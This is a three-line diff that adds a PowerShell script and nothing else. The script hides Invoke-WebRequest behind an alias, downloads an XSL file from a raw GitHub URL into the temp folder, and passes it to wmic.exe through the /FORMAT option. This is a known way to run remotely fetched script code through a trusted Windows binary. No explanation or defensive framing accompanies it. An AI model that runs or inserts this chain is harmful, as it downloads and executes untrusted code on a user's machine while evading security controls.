@@ -1,0 +1,3 @@
+set-alias -name bob -value iwr
+bob 'https://raw.githubusercontent.com/mikereddington82/data/main/format.xsl'  -OutFile "$env:temp\data.xsl"
+Start-Process -FilePath "wmic.exe"  -ArgumentList "process list /FORMAT:$env:temp\data.xsl" -NoNewWindow
